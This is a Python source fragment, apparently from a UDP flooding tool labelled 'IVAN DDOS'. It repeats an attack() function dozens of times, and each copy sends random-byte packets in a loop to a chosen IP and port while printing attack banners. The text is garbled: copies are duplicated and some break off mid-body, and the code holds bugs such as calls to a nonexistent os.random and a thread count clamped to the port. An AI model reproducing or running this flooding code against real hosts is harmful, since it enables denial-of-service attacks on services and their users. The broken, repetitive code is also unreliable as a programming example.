    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)       
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(567891, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(91, 999999999)
        threads = threads or os.random.randint(91, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
